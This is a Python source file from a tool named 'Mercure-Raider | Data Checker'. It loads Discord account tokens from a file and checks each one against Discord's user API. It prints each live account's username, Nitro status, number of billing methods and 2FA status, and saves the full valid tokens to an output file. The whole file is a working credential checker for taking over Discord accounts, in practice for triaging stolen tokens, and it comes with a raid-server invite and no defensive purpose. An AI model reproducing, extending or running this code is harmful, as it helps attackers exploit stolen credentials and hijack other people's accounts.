from assets import *


r = Fore.RESET
c = Fore.RED
g = Fore.LIGHTBLACK_EX
s = Fore.BLACK
x = Fore.GREEN
k = Fore.YELLOW

dark_red_color = Fore.RED
light_green_color = '\033[92m'
grey_color = '\033[90m'
reset_color = '\033[0m'

RED = Fore.RED
RESET = "\033[0m"

timestamp = datetime.datetime.now().strftime(f'{c}[{g}%H:%M:%S{c}]{c}')

banner = f"""
                                {Fore.RED} _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
"""

def check_token(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            username = user_data.get('username', 'Not Available')
            nitro = user_data.get('premium_type', 0) != 0
            billing_amount = len(user_data.get('billing_methods', []))
            has_2fa = user_data.get('mfa_enabled', False)
            return (True, username, nitro, billing_amount, has_2fa)
        elif response.status_code == 401:
            return (False, "Invalid Token", None, None, None)
        elif response.status_code == 403:
            return (False, "Forbidden", None, None, None)
        elif response.status_code == 429:
            return (False, "Rate Limited", None, None, None)
        else:
            return (False, "Unknown Error", None, None, None)
    except Exception as e:
        return (False, str(e), None, None, None)

def save_tokens(tokens, file_path, order):
    try:
        with open(file_path, 'w') as f:
            for token_info in tokens:
                f.write(order.format(*token_info) + '\n')
        print("                                Valid tokens saved successfully.")
    except Exception as e:
        print(f"                                Error saving tokens: {e}")

def token_formatter():
    tokens_file = 'assets/input/tokens.txt'
    valid_tokens = []
    limited_tokens = []
    invalid_tokens = []

    with open(tokens_file, 'r') as f:
        tokens = f.read().splitlines()

    self = """                  
                                \033[31m _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
    """                                           
    print(self) 

    for token in tokens:
        status, username, nitro, billing_amount, has_2fa = check_token(token)
        if status is True:
            valid_tokens.append((status, username, nitro, billing_amount, has_2fa, token))
            print(f"{dark_red_color}                               {timestamp} {x}(+){x} {x}{Fore.LIGHTGREEN_EX}[{Fore.LIGHTGREEN_EX}{x}VALID{x}{Fore.LIGHTGREEN_EX}]{Fore.LIGHTGREEN_EX}{x} {g}~>{g} {g}{token[:20]}{g} {g}~>{g} {x}200{x}")
        elif status == 403:
            limited_tokens.append((status, username, nitro, billing_amount, has_2fa, token))
            print(f"{dark_red_color}                               {timestamp} {k}(+){k} {k}{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTYELLOW_EX}{k}LOCKED{k}{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTYELLOW_EX}{k} {g}~>{g} {g}{token[:20]}{g} {g}~>{g} {k}403{k}")
        else:
            invalid_tokens.append((status, username, nitro, billing_amount, has_2fa, token))
            print(f"{dark_red_color}                               {timestamp} {c}(+){c} {c}{Fore.LIGHTRED_EX}[{Fore.LIGHTRED_EX}{c}INVALID{c}{Fore.LIGHTRED_EX}]{Fore.LIGHTRED_EX}{c} {g}~>{g} {g}{token[:20]}{g} {g}~>{g} {c}403{c}")

    os.system('cls' if os.name == 'nt' else 'clear')

    self = f"""                                              
                                \033[31m _____ _____ _____ _____ _____ _____ _____  
                                |     |   __| __  |     |  |  | __  |   __| | {x}Valid{x} {g}>{g} {c}{len(valid_tokens)}
                                | | | |   __|    -|   --|  |  |    -|   __| | {c}Invalid{c} {g}>{g} {c}{len(invalid_tokens)}
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____| {c}| {k}Locked{k} {g}>{g} {c}{len(limited_tokens)}
    """ 
    print(self) 

    action = input(f"{dark_red_color}                                [Enter 'show' to display token status, 'save' to save valid tokens] > ").lower()
    if action == 'show':
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        for token_info in valid_tokens:
            print(f"{dark_red_color}                                -----------------------------")
            print(f"{dark_red_color}                                Mercure-Raider | Data Checker")
            print(f"{dark_red_color}                                Token >", token_info[5])
            print(f"{dark_red_color}                                Username >", token_info[1])
            print(f"{dark_red_color}                                Nitro >", "Yes" if token_info[2] else "No")
            print(f"{dark_red_color}                                Billing Amount >", token_info[3])
            print(f"{dark_red_color}                                2FA >", "Enabled" if token_info[4] else "Disabled")
            print(f"{dark_red_color}                                Valid >", token_info[0])
            print(f"{dark_red_color}                                ----------------------------")
            time.sleep(4)
    elif action == 'save':
        order = """
discord.gg/mercureraider formatter
-------------------------------------        
Token > {5}
Username > {1}
Nitro > {2}
Billing Amount > {3}
2FA > {4}
Valid > {0}
-------------------------------------"""
        try:
            directory = os.path.dirname('assets/output/formatted_tokens.txt')
            print("                                Directory:", directory)
            os.makedirs(directory, exist_ok=True)
            save_tokens(valid_tokens, 'assets/output/formatted_tokens.txt', order)
        except Exception as e:
            print(f"                                Error creating directory or saving tokens: {e}")
        input("                                Press Enter")